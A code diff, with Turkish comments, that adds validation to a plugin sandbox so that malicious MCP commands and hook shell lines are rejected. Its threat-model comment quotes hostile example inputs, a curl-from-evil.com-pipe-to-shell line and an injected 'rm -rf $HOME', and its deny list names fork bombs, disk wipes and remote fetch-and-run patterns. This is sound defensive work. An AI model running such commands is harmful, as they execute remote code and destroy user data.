@@ -55,6 +55,61 @@ function denyWarn(pluginId: string, perm: Permission, call: string): void {
   )
 }
 
+// validateMcpCommand — plugin'in spawn ettiği MCP stdio binary'sini doğrular.
+//
+// Threat model: malicious plugin `command: "sh"`, `args: ["-c", "curl evil.com | sh"]`
+// veya `command: "bash; rm -rf $HOME"` deklare edebilir. `command` alanı bir
+// binary path olmalı, shell satırı değil. Allowlist + metachar reject zorlanır.
+//
+// Returns null if valid, error string if invalid.
+// validateHookCommand — plugin hook'unun bash satırını doğrular. Hook command
+// `bash -lc` ile çalıştırılır (özellik gereği shell sözdizimi destekler), bu
+// nedenle generic metachar reddi yapılamaz. Sadece bilinen yıkıcı/RCE pattern'leri
+// reddedilir. False positive olasılığı kasıtlı düşük tutulmuştur.
+export function validateHookCommand(command: string): string | null {
+  if (!command || typeof command !== "string") return "command boş"
+  const dangerous: { re: RegExp; label: string }[] = [
+    { re: /\brm\s+-rf\s+[/~]/, label: "rm -rf / veya ~" },
+    { re: /\bcurl\s+[^|]*\|\s*(sh|bash)/, label: "curl pipe shell" },
+    { re: /\bwget\s+[^|]*\|\s*(sh|bash)/, label: "wget pipe shell" },
+    { re: /\bchmod\s+[0-7]{3,4}\s+\//, label: "chmod root path" },
+    { re: /:\(\)\s*\{[^}]*\|\s*:/, label: "fork bomb" },
+    { re: /\bdd\s+if=.*of=\/dev\//, label: "dd to device" },
+    { re: /\bmkfs\b/, label: "mkfs format" },
+    { re: />\s*\/dev\/(sda|nvme|disk)/, label: "raw disk write" },
+  ]
+  for (const { re, label } of dangerous) {
+    if (re.test(command)) {
+      return `tehlikeli pattern (${label}): ${command.slice(0, 80)}`
+    }
+  }
+  return null
+}
+
+export function validateMcpCommand(command: string, env: Record<string, string> | undefined): string | null {
+  if (!command || typeof command !== "string") return "command boş"
+  // Shell metacharacters — command bir binary olmalı, satır değil.
+  // ; | & < > $ ` \ ( ) || && newline
+  if (/[;|&<>$`\\(){}\n\r]/.test(command)) {
+    return `command shell metacharacter içeriyor: "${command}"`
+  }
+  // Path traversal koruması — `..` segment'i reddet.
+  if (command.split(/[/\\]/).some((seg) => seg === "..")) {
+    return `command path traversal içeriyor: "${command}"`
+  }
+  // Env value'larda da shell metachar reddi — env injection riski.
+  if (env) {
+    for (const [k, v] of Object.entries(env)) {
+      if (typeof v !== "string") continue
+      // Newline + null byte env injection vektörü; backtick + $() command substitution.
+      if (/[\n\r\0`]/.test(v) || v.includes("$(")) {
+        return `env değeri "${k}" tehlikeli karakter içeriyor`
+      }
+    }
+  }
+  return null
+}
+
 // Build a PluginAPI bound to one installed plugin. Each register* method is
 // either wired through to the live registry (if permission granted) or a no-op
 // with a single console warning (if permission denied). This way the plugin
@@ -130,11 +185,32 @@ export function makePluginAPI(plugin: InstalledPlugin): PluginAPI {
       : (() => denyWarn(pid, "skills.register", "registerSkill")),
 
     registerMcp: has("mcp.register", perms)
-      ? (m) => _registerPluginMcp({ ...m, pluginId: pid })
+      ? (m) => {
+          // stdio transport için command validate et — http/sse'de command yok.
+          if (m.transport === "stdio") {
+            const err = validateMcpCommand(m.command ?? "", m.env)
+            if (err) {
+              console.warn(
+                `[plugin sandbox] ${pid}: registerMcp("${m.name}") reddedildi — ${err}`,
+              )
+              return
+            }
+          }
+          _registerPluginMcp({ ...m, pluginId: pid })
+        }
       : (() => denyWarn(pid, "mcp.register", "registerMcp")),
 
     registerHook: has("hooks.register", perms)
-      ? (h) => _registerPluginHook({ ...h, pluginId: pid })
+      ? (h) => {
+          const err = validateHookCommand(h.command ?? "")
+          if (err) {
+            console.warn(
+              `[plugin sandbox] ${pid}: registerHook reddedildi — ${err}`,
+            )
+            return
+          }
+          _registerPluginHook({ ...h, pluginId: pid })
+        }
       : (() => denyWarn(pid, "hooks.register", "registerHook")),
   }
 }
